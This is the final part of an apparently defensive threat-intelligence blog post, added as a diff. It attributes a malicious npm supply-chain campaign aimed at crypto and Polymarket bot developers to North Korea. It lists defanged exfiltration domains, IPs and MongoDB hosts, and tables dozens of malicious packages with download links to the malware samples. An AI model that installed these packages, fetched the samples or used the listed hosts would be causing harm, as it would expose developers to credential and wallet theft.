+malware signatures, and operational procedures are consistent with known 
+North Korean tactics.
+
+Given these overlaps, it is unlikely this is being conducted by an actor of different
+origins. The evidence I've presented here supports a high-confidence attribution 
+to DPRK's malware operations. Specific attribution to FAMOUS CHOLLIMA is withheld
+until further, more concrete overlaps comes to light.
+
+## Closing thoughts
+
+Presented here is the assessment of a single threat intelligence numpty
+whose current interest is tracking DPRK malware, so take it with a grain of salt.
+
+Attribution aside, the scale, disparate infection chains, and techniques on display here
+are impressive. I have not even scratched the surface here. There are many more
+IOCs and strains of malware to discover.
+
+## IOCs
+
+### Malware network IOCs
+
+| type | value |
+| --- | --- |
+| domain | polblxpnl[.]space |
+| domain | polymarket-cli-testing.vercel[.]app |
+| domain | changelog[.]rest |
+| domain | api.soladify[.]fun |
+| domain | api.mywalletsss[.]store |
+| domain | api.fivefingerz[.]dev |
+| domain | chalk-logger.vercel[.]app |
+| domain | api.bpkythuat[.]com |
+| domain | cloudflareguard.vercel[.]app |
+| domain | clob-polymarket[.]com |
+| domain | cloudflareinsights.vercel[.]app |
+| domain | hsdf22-tracing-ethers.vercel[.]app |
+| domain | www[.]blxrbn[.]com |
+| domain | polymarket-clob[.]com |
+| domain | logger.clob[.]health |
+| domain | sha256-validate-rpc.vercel[.]app |
+| domain | eslint-helper.vercel[.]app |
+| ip | 45[.]8[.]22[.]144 |
+| ip | 65.109.25[.]6 |
+| ip | 154.38.188[.]168 |
+| ip | 23.137.105[.]114 |
+| db | cluster0.1ufrx5i.mongodb[.]net |
+| db | aster.iejv3bg.mongodb[.]net |
+
+### npm packages
+
+Intermediate dependencies are marked as "ID"
+
+| Released | Package (version) | npm user | Download tgz sample | Comment |
+|:---|:---|:---|:---|:---|
+| 2026-03-16 14:20:24 |  logger-beauty (v1.0.2) | cryptopawsol (cryptopawsol[@]gmail.com)| [logger-beauty-1.0.2.tgz](https://dprk-research.kmsec.uk/api/tarfiles/logger-beauty/1.0.2) | exfil: polblxpnl[.]space | 
+| 2026-03-16 11:37:42 |  big-numerate (v5.0.3) | ja.vierj.ea.n.070 (ja.vierj.ea.n.070[@]googlemail.com)| [big-numerate-5.0.3.tgz](https://dprk-research.kmsec.uk/api/tarfiles/big-numerate/5.0.3) | intermediate dependency (ID) for `es-lint-entry` | 
+| 2026-03-16 11:24:50 |  lint-builders (v1.0.0) | ja.vierj.ea.n.070 (ja.vierj.ea.n.070[@]googlemail.com)| [lint-builders-1.0.0.tgz](https://dprk-research.kmsec.uk/api/tarfiles/lint-builders/1.0.0) |  | 
+| 2026-03-16 11:23:08 |  linter-entry (v1.0.0) | ja.vierj.ea.n.070 (ja.vierj.ea.n.070[@]googlemail.com)| [linter-entry-1.0.0.tgz](https://dprk-research.kmsec.uk/api/tarfiles/linter-entry/1.0.0) |  | 
+| 2026-03-16 10:44:40 |  es-lint-entry (v1.0.0) | ja.vierj.ea.n.070 (ja.vierj.ea.n.070[@]googlemail.com)| [es-lint-entry-1.0.0.tgz](https://dprk-research.kmsec.uk/api/tarfiles/es-lint-entry/1.0.0) | | 
+| 2026-03-16 10:07:53 |  npm-doc-deploy (v1.0.2) | nomedicine999 (department.c0809[@]gmail.com)| [npm-doc-deploy-1.0.2.tgz](https://dprk-research.kmsec.uk/api/tarfiles/npm-doc-deploy/1.0.2) | exfil: polymarket-cli-testing.vercel[.]app | 
+| 2026-03-16 08:49:30 |  bignum-ts-v2 (v5.0.3) | nomedicine999 (department.c0809[@]gmail.com)| [bignum-ts-v2-5.0.3.tgz](https://dprk-research.kmsec.uk/api/tarfiles/bignum-ts-v2/5.0.3) | ID for `npm-doc-deploy` | 
+| 2026-03-16 08:44:39 |  npm-doc-deploy (v1.0.1) | nomedicine999 (department.c0809[@]gmail.com)| [npm-doc-deploy-1.0.1.tgz](https://dprk-research.kmsec.uk/api/tarfiles/npm-doc-deploy/1.0.1) | exfil: polymarket-cli-testing.vercel[.]app | 
+| 2026-03-16 07:54:44 |  big-numerator (v5.0.3) | j.eral.dn.ac.ar11.223.3 (j.eral.dn.ac.ar11.223.3[@]gmail.com)| [big-numerator-5.0.3.tgz](https://dprk-research.kmsec.uk/api/tarfiles/big-numerator/5.0.3) | ID for `es-lint-builders` | 
+| 2026-03-16 01:21:54 |  changelog-logger-utilities (v1.0.0) | toskypi (tosky.pi1016[@]gmail.com)| [changelog-logger-utilities-1.0.0.tgz](https://dprk-research.kmsec.uk/api/tarfiles/changelog-logger-utilities/1.0.0) | exfil: changelog[.]rest | 
+| 2026-03-15 23:01:08 |  pretty-ts-logger (v1.0.5) | traderdev (vsniper97[@]gmail.com)| [pretty-ts-logger-1.0.5.tgz](https://dprk-research.kmsec.uk/api/tarfiles/pretty-ts-logger/1.0.5) | exfil: api.soladify[.]fun | 
+| 2026-03-15 22:58:58 |  jonas-prettier-logger (v2.0.1) | jonas-code77 (jonas.schneider77@hotmail.com)| [jonas-prettier-logger-2.0.1.tgz](https://dprk-research.kmsec.uk/api/tarfiles/jonas-prettier-logger/2.0.1) | exfil: api.mywalletsss[.]store | 
+| 2026-03-15 21:12:28 |  pretty-loggers (v0.1.4) | matthiasdev2026 (matthiasdev2026@outlook.com)| [pretty-loggers-0.1.4.tgz](https://dprk-research.kmsec.uk/api/tarfiles/pretty-loggers/0.1.4) | exfil: api.fivefingerz[.]dev | 
+| 2026-03-15 20:44:02 |  pretty-loggers (v0.1.3) | matthiasdev2026 (matthiasdev2026@outlook.com)| [pretty-loggers-0.1.3.tgz](https://dprk-research.kmsec.uk/api/tarfiles/pretty-loggers/0.1.3) | exfil: api.fivefingerz[.]dev | 
+| 2026-03-14 20:01:32 |  chalk-logger-prettier (v1.0.3) | bababa (bilalkilnaz.54[@]gmail.com)| [chalk-logger-prettier-1.0.3.tgz](https://dprk-research.kmsec.uk/api/tarfiles/chalk-logger-prettier/1.0.3) | exfil: chalk-logger.vercel[.]app | 
+| 2026-03-12 18:49:27 |  big-numben (v5.0.3) | w.ixs.t.ocle (w.ixs.t.ocle[@]googlemail.com)| [big-numben-5.0.3.tgz](https://dprk-research.kmsec.uk/api/tarfiles/big-numben/5.0.3) | ID for `es-lint-builder` | 
+| 2026-03-12 18:19:53 |  es-lint-builder (v1.0.1) | w.ixs.t.ocle (w.ixs.t.ocle[@]googlemail.com)| [es-lint-builder-1.0.1.tgz](https://dprk-research.kmsec.uk/api/tarfiles/es-lint-builder/1.0.1) |  | 
+| 2026-03-12 16:29:02 |  big-numben (v5.0.2) | w.ixs.t.ocle (w.ixs.t.ocle[@]googlemail.com)| [big-numben-5.0.2.tgz](https://dprk-research.kmsec.uk/api/tarfiles/big-numben/5.0.2) | ID for `es-lint-builder` | 
+| 2026-03-12 16:24:38 |  es-lint-builder (v1.0.0) | w.ixs.t.ocle (w.ixs.t.ocle[@]googlemail.com)| [es-lint-builder-1.0.0.tgz](https://dprk-research.kmsec.uk/api/tarfiles/es-lint-builder/1.0.0) |  | 
+| 2026-03-12 14:51:50 |  pino-utils (v1.4.0) | satyasu8 (hp9570[@]gmail.com)| [pino-utils-1.4.0.tgz](https://dprk-research.kmsec.uk/api/tarfiles/pino-utils/1.4.0) | exfil: api.bpkythuat[.]com | 
+| 2026-03-12 09:50:19 |  pino-utils (v1.3.6) | satyasu8 (hp9570[@]gmail.com)| [pino-utils-1.3.6.tgz](https://dprk-research.kmsec.uk/api/tarfiles/pino-utils/1.3.6) | exfil: api.bpkythuat[.]com | 
+| 2026-03-12 09:25:56 |  chalk-logger-prettier (v1.0.2) | bababa (bilalkilnaz.54[@]gmail.com)| [chalk-logger-prettier-1.0.2.tgz](https://dprk-research.kmsec.uk/api/tarfiles/chalk-logger-prettier/1.0.2) | exfil: chalk-logger.vercel[.]app | 
+| 2026-03-12 06:47:53 |  ts-bign (v1.2.8) | l.os.t.k.yl.e184 (l.os.t.k.yl.e184[@]gmail.com)| [ts-bign-1.2.8.tgz](https://dprk-research.kmsec.uk/api/tarfiles/ts-bign/1.2.8) | ID for `levex-refa` | 
+| 2026-03-12 06:39:51 |  levex-refa (v1.0.0) | l.os.t.k.yl.e184 (l.os.t.k.yl.e184[@]gmail.com)| [levex-refa-1.0.0.tgz](https://dprk-research.kmsec.uk/api/tarfiles/levex-refa/1.0.0) | exfil: cloudflareguard.vercel[.]app | 
+| 2026-03-12 06:20:26 |  pino-logger-utils (v1.0.1) | anderson2626 (conrad.anderson75926[@]gmail.com)| [pino-logger-utils-1.0.1.tgz](https://dprk-research.kmsec.uk/api/tarfiles/pino-logger-utils/1.0.1) | exfil: clob-polymarket[.]com | 
+| 2026-03-11 17:13:59 |  big-nunber (v5.0.2) | nami.jam.i.h.s.h.s (nami.jam.i.h.s.h.s[@]googlemail.com)| [big-nunber-5.0.2.tgz](https://dprk-research.kmsec.uk/api/tarfiles/big-nunber/5.0.2) | ID for `lint-builder` | 
+| 2026-03-11 17:11:03 |  lint-builder (v1.0.0) | nami.jam.i.h.s.h.s (nami.jam.i.h.s.h.s[@]googlemail.com)| [lint-builder-1.0.0.tgz](https://dprk-research.kmsec.uk/api/tarfiles/lint-builder/1.0.0) | exfil: cloudflareinsights.vercel[.]app | 
+| 2026-03-10 17:27:57 |  tracing-str (v2.0.3) | bababa (bilalkilnaz.54[@]gmail.com)| [tracing-str-2.0.3.tgz](https://dprk-research.kmsec.uk/api/tarfiles/tracing-str/2.0.3) | hsdf22-tracing-ethers.vercel[.]app | 
+| 2026-03-09 19:25:48 |  ts-lint-builder (v1.0.9) | digoschristiann (di.gos.c.hristia.n.n[@]googlemail.com)| [ts-lint-builder-1.0.9.tgz](https://dprk-research.kmsec.uk/api/tarfiles/ts-lint-builder/1.0.9) | exfil: cloudflareinsights.vercel[.]app | 
+| 2026-03-06 08:00:33 |  pino-pretty-log (v1.0.0) | comet1234 (dennis.adadj[@]gmail.com)| [pino-pretty-log-1.0.0.tgz](https://dprk-research.kmsec.uk/api/tarfiles/pino-pretty-log/1.0.0) | exfil: www.blxrbn[.]com | 
+| 2026-03-03 10:26:03 |  bignum-ts (v8.0.8) | digoschristiann (di.gos.c.hristia.n.n[@]googlemail.com)| [bignum-ts-8.0.8.tgz](https://dprk-research.kmsec.uk/api/tarfiles/bignum-ts/8.0.8) | ID for `ts-lint-builder` | 
+| 2026-03-03 10:18:47 |  ts-lint-builder (v1.0.8) | digoschristiann (di.gos.c.hristia.n.n[@]googlemail.com)| [ts-lint-builder-1.0.8.tgz](https://dprk-research.kmsec.uk/api/tarfiles/ts-lint-builder/1.0.8) | exfil: cloudflareinsights.vercel[.]app | 
+| 2026-03-03 10:12:07 |  npm-builders (v1.0.8) | digoschristiann (di.gos.c.hristia.n.n[@]googlemail.com)| [npm-builders-1.0.8.tgz](https://dprk-research.kmsec.uk/api/tarfiles/npm-builders/1.0.8) | exfil: cloudflareinsights.vercel[.]app  | 
+| 2026-03-01 00:04:16 |  @mgcrae/pino-pretty-logger (v1.0.5) | itspengu (julius.tan.biz[@]gmail.com)| [@mgcrae/pino-pretty-logger-1.0.5.tgz](https://dprk-research.kmsec.uk/api/tarfiles/@mgcrae%2Fpino-pretty-logger/1.0.5) | exfil: polymarket-clob[.]com | 
+| 2026-02-27 10:19:51 |  pretty-fancy (v1.0.3) | npm_kei (keidev60[@]gmail.com)| [pretty-fancy-1.0.3.tgz](https://dprk-research.kmsec.uk/api/tarfiles/pretty-fancy/1.0.3) | exfil: logger.clob[.]health | 
+| 2026-02-27 01:50:44 |  pretty-fancy (v1.0.2) | npm_kei (keidev60[@]gmail.com)| [pretty-fancy-1.0.2.tgz](https://dprk-research.kmsec.uk/api/tarfiles/pretty-fancy/1.0.2) | exfil: logger.clob[.]health | 
+| 2026-02-26 20:52:18 |  npm-doc-builder (v1.0.5) | al.lanjaysa.t.i.a.gi (al.lanjaysa.t.i.a.gi[@]gmail.com)| [npm-doc-builder-1.0.5.tgz](https://dprk-research.kmsec.uk/api/tarfiles/npm-doc-builder/1.0.5) | exfil: cloudflareinsights.vercel[.]app | 
+| 2026-02-26 20:43:21 |  npm-doc-builder (v1.0.4) | al.lanjaysa.t.i.a.gi (al.lanjaysa.t.i.a.gi[@]gmail.com)| [npm-doc-builder-1.0.4.tgz](https://dprk-research.kmsec.uk/api/tarfiles/npm-doc-builder/1.0.4) | exfil: cloudflareinsights.vercel[.]app | 
+| 2026-02-26 20:33:39 |  npm-doc-builder (v1.0.3) | al.lanjaysa.t.i.a.gi (al.lanjaysa.t.i.a.gi[@]gmail.com)| [npm-doc-builder-1.0.3.tgz](https://dprk-research.kmsec.uk/api/tarfiles/npm-doc-builder/1.0.3) | exfil: cloudflareinsights.vercel[.]app | 
+| 2026-02-26 20:08:08 |  ts-big-number (v8.0.7) | al.lanjaysa.t.i.a.gi (al.lanjaysa.t.i.a.gi[@]gmail.com)| [ts-big-number-8.0.7.tgz](https://dprk-research.kmsec.uk/api/tarfiles/ts-big-number/8.0.7) | ID for `npm-doc-builder` | 
+| 2026-02-26 19:01:40 |  npm-doc-builder (v1.0.2) | al.lanjaysa.t.i.a.gi (al.lanjaysa.t.i.a.gi[@]gmail.com)| [npm-doc-builder-1.0.2.tgz](https://dprk-research.kmsec.uk/api/tarfiles/npm-doc-builder/1.0.2) | exfil: cloudflareinsights.vercel[.]app  | 
+| 2026-02-22 23:56:08 |  pretty-fancy (v1.0.1) | npm_kei (keidev60[@]gmail.com)| [pretty-fancy-1.0.1.tgz](https://dprk-research.kmsec.uk/api/tarfiles/pretty-fancy/1.0.1) | exfil: logger.clob[.]health | 
+| 2026-02-22 23:49:01 |  pretty-fancy (v1.0.0) | npm_kei (keidev60[@]gmail.com)| [pretty-fancy-1.0.0.tgz](https://dprk-research.kmsec.uk/api/tarfiles/pretty-fancy/1.0.0) | exfil: logger.clob[.]health | 
+| 2026-02-22 22:14:17 |  pretty-pino-logger (v2.0.2) | npm_kei (keidev60[@]gmail.com)| [pretty-pino-logger-2.0.2.tgz](https://dprk-research.kmsec.uk/api/tarfiles/pretty-pino-logger/2.0.2) | exfil: logger.clob[.]health | 
+| 2026-02-21 18:57:08 |  decode-sdks (v1.0.3) | jacobtan (jacobtan0107.pm[@]gmail.com)| [decode-sdks-1.0.3.tgz](https://dprk-research.kmsec.uk/api/tarfiles/decode-sdks/1.0.3) | exfil: hxxp://45[.]8[.]22[.]144:8080/deep-es6 | 
+| 2026-02-21 17:45:57 |  decode-sdks (v1.0.2) | jacobtan (jacobtan0107.pm[@]gmail.com)| [decode-sdks-1.0.2.tgz](https://dprk-research.kmsec.uk/api/tarfiles/decode-sdks/1.0.2) | exfil: hxxp://45[.]8[.]22[.]144:8080/deep-es6 | 
+| 2026-02-21 15:15:10 |  @jacobtan/decode-sdk (v1.0.0) | jacobtan (jacobtan0107.pm[@]gmail.com)| [@jacobtan_decode-sdk-1.0.0.tgz](https://dprk-research.kmsec.uk/api/tarfiles/@jacobtan%2Fdecode-sdk/1.0.0) | exfil: hxxp://45[.]8[.]22[.]144:8080/deep-es6  | 
+| 2026-02-20 22:18:41 |  polymarket-validator (v1.0.2) | toskypi (tosky.pi1016[@]gmail.com)| [polymarket-validator-1.0.2.tgz](https://dprk-research.kmsec.uk/api/tarfiles/polymarket-validator/1.0.2) | exfil: sha256-validate-rpc.vercel[.]app | 
+| 2026-02-20 19:52:48 |  ts-big-number (v8.0.5) | al.lanjaysa.t.i.a.gi (al.lanjaysa.t.i.a.gi[@]gmail.com)| [ts-big-number-8.0.5.tgz](https://dprk-research.kmsec.uk/api/tarfiles/ts-big-number/8.0.5) | ID for `npm-doc-builder` | 
+| 2026-02-20 19:45:49 |  npm-doc-builder (v1.0.0) | al.lanjaysa.t.i.a.gi (al.lanjaysa.t.i.a.gi[@]gmail.com)| [npm-doc-builder-1.0.0.tgz](https://dprk-research.kmsec.uk/api/tarfiles/npm-doc-builder/1.0.0) | exfil: cloudflareinsights.vercel[.]app | 
+| 2026-02-20 19:02:27 |  polymarket-validator (v1.0.1) | toskypi (tosky.pi1016[@]gmail.com)| [polymarket-validator-1.0.1.tgz](https://dprk-research.kmsec.uk/api/tarfiles/polymarket-validator/1.0.1) | exfil: sha256-validate-rpc.vercel[.]app | 
+| 2026-02-19 12:04:38 |  bn-eslint.js (v8.0.5) | amauri_jesus (cashblaze1001[@]gmail.com)| [bn-eslint.js-8.0.5.tgz](https://dprk-research.kmsec.uk/api/tarfiles/bn-eslint.js/8.0.5) | ID for `npm-eslint-helper` | 
+| 2026-02-19 12:03:41 |  npm-eslint-helper (v1.0.1) | amauri_jesus (cashblaze1001[@]gmail.com)| [npm-eslint-helper-1.0.1.tgz](https://dprk-research.kmsec.uk/api/tarfiles/npm-eslint-helper/1.0.1) | exfil: eslint-helper.vercel[.]app | 
+
+## Appendix
+
+
+### Anomalous findings
+
+While sleuthing, I also found atypical malware. 
+[katlogic/solana-arbitrage-bot](https://github.com/katlogic/solana-arbitrage-bot/blob/master/package.json#L40)
+depends on pino-sdk, which is a discord exfiltrator.
+You can view that [sample on my DPRK research website](https://dprk-research.kmsec.uk/api/samples/2bf7eddd59258b03d9c4facb3cc469f3703caa9e15c2cd0ae46be09d850b8a0b).
+
+I also identified polymarket bots being advertised on [Medium](https://medium.com/@benjamin.bigdev/unlocking-edges-in-polymarkets-5-minute-crypto-markets-last-second-dynamics-bot-strategies-and-db8efcb5c196) and Instagram (screenshot below).
+This is highly suspicious as the repository matches themes of other Contagious
+Trader projects, but I [haven't found the malware in the repository 
+yet](https://github.com/Gabagool2-2/polymarket-trading-bot-python) (a challenge
+for you, dear reader!).
+
+<Fig src={InstagramAdvertising} caption="Advertising trading bots on Instagram" />
+
+<Fig src={AdvertisingOnMedium} caption="An almost certainly AI-generated Medium post advertising a trading bot" />
+
+### Additional resources
+
+Below are some additional screenshots I captured that didn't fit into the 
+narrative of this blog.
+
+<Fig src={AnotoEcossistemCopyBotBlame} caption="Git blame showing GitHub user `crypmancer` (now removed) responsible for adding malicious dependency `pino-pretty-log` to `Anoto-ecossistem/polymarket-copy-bot`" />
+<Fig src={BignumTsPackageJsonDependecy2} caption="The package.json of `Tiartyos/polymarket-copytrading-bot-sport` showing `bign.ts` and `bignum-ts` as dependencies - both are malicious and duplicative" />
+<Fig src={BignumTsPackageJsonDependecy} caption="package.json and latest commit detail of `dev-protocol/polymarket-copytrading-bot-sport`, showing GitHub user `insionCEO` contributing to the project. `bignum-ts` is on display as a dependency" />
+<Fig src={HodlwardenBlame} caption="Git blame of `hodlwarden/polymarket-arbitrage-copy-bot` demonstrating a rich commit history, with malicious dependency `pino-pretty-log` added by GitHub user `hodlwarden`" />
